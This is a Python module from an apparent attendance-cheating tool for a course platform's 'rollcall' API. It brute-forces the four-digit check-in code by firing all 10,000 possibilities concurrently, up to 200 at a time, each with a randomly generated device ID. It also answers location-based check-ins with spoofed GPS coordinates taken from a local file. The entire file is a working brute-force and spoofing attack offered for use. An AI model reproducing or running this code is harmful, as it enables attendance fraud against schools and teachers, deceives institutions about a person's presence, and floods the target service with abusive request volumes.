"""
Rollcall verification module
Handles number code brute-force and radar location submission
"""

import uuid
import time
import asyncio
import aiohttp
import os
import sys
from aiohttp import CookieJar
from config import BASE_URL, Colors

# Load configuration
base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
file_path = os.path.join(base_dir, "info.txt")

# Read coordinates from config file
try:
    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.readlines()
        LATITUDE = lines[2].strip() if len(lines) > 2 else "24.0"
        LONGITUDE = lines[3].strip() if len(lines) > 3 else "118.0"
except (FileNotFoundError, IndexError):
    print(f"{Colors.WARNING}Warning: Could not read coordinates from info.txt{Colors.ENDC}")
    LATITUDE = "24.0"
    LONGITUDE = "118.0"


def pad_number(number: int) -> str:
    """
    Pad number to 4 digits with leading zeros
    
    Args:
        number: Number to pad (0-9999)
        
    Returns:
        4-digit string like "0042"
    """
    return str(number).zfill(4)


async def try_number_code(
    code: int, 
    session: aiohttp.ClientSession, 
    stop_flag: asyncio.Event,
    answer_url: str, 
    semaphore: asyncio.Semaphore
) -> str:
    """
    Try a single number code for rollcall
    
    Args:
        code: Number code to try (0-9999)
        session: aiohttp session
        stop_flag: Event to signal when correct code found
        answer_url: API endpoint URL
        semaphore: Semaphore for rate limiting
        
    Returns:
        Padded code string if successful, empty string otherwise
    """
    if stop_flag.is_set():
        return ""
    
    async with semaphore:
        if stop_flag.is_set():
            return ""
        
        payload = {
            "deviceId": str(uuid.uuid4()),
            "numberCode": pad_number(code)
        }
        
        try:
            async with session.put(answer_url, json=payload) as response:
                if response.status == 200:
                    stop_flag.set()
                    return pad_number(code)
        except Exception:
            pass
        
        return ""


async def brute_force_number_code(requests_session, rollcall_id: str) -> tuple:
    """
    Brute force number code using async requests
    
    Args:
        requests_session: Original requests session (for cookies)
        rollcall_id: Rollcall ID to answer
        
    Returns:
        Tuple of (success: bool, code: str, time_taken: float)
    """
    url = f"{BASE_URL}/api/rollcall/{rollcall_id}/answer_number_rollcall"
    
    stop_flag = asyncio.Event()
    semaphore = asyncio.Semaphore(200)  # Max 200 concurrent requests
    
    # Convert requests cookies to aiohttp CookieJar
    cookie_jar = CookieJar()
    for cookie in requests_session.cookies:
        cookie_jar.update_cookies({cookie.name: cookie.value})
    
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(
        headers=requests_session.headers, 
        cookie_jar=cookie_jar,
        timeout=timeout
    ) as session:
        # Create tasks for all 10000 possible codes
        tasks = [
            asyncio.create_task(
                try_number_code(i, session, stop_flag, url, semaphore)
            ) 
            for i in range(10000)
        ]
        
        try:
            # Wait for any task to succeed
            for coro in asyncio.as_completed(tasks):
                result = await coro
                if result:  # Found the correct code
                    # Cancel remaining tasks
                    for task in tasks:
                        if not task.done():
                            task.cancel()
                    return True, result
        finally:
            # Ensure all tasks are cleaned up
            for task in tasks:
                if not task.done():
                    task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    
    return False, ""


def submit_number_code(session, rollcall_id: str) -> bool:
    """
    Submit number code rollcall using brute-force method
    
    Args:
        session: Requests session object
        rollcall_id: Rollcall ID to answer
        
    Returns:
        True if successful, False otherwise
    """
    print(f"{Colors.OKCYAN}Attempting number code brute-force...{Colors.ENDC}")
    start_time = time.time()
    
    try:
        success, code = asyncio.run(brute_force_number_code(session, rollcall_id))
        elapsed = time.time() - start_time
        
        if success:
            print(f"{Colors.OKGREEN}✓ Number code found: {code}{Colors.ENDC}")
            print(f"{Colors.GRAY}Time taken: {elapsed:.2f}s{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}✗ Failed to find code{Colors.ENDC}")
            print(f"{Colors.GRAY}Time taken: {elapsed:.2f}s{Colors.ENDC}")
            return False
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"{Colors.FAIL}✗ Error during brute-force: {e}{Colors.ENDC}")
        print(f"{Colors.GRAY}Time taken: {elapsed:.2f}s{Colors.ENDC}")
        return False


def submit_radar_rollcall(session, rollcall_id: str) -> bool:
    """
    Submit radar rollcall with GPS coordinates
    
    Args:
        session: Requests session object
        rollcall_id: Rollcall ID to answer
        
    Returns:
        True if successful, False otherwise
    """
    url = f"{BASE_URL}/api/rollcall/{rollcall_id}/answer"
    
    payload = {
        "accuracy": 35,
        "altitude": 0,
        "altitudeAccuracy": None,
        "deviceId": str(uuid.uuid4()),
        "heading": None,
        "latitude": LATITUDE,
        "longitude": LONGITUDE,
        "speed": None
    }
    
    try:
        response = session.put(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}✓ Radar rollcall answered successfully{Colors.ENDC}")
            print(f"{Colors.GRAY}Location: ({LATITUDE}, {LONGITUDE}){Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}✗ Radar rollcall failed (status: {response.status_code}){Colors.ENDC}")
            return False
    except Exception as e:
        print(f"{Colors.FAIL}✗ Error submitting radar rollcall: {e}{Colors.ENDC}")
        return False
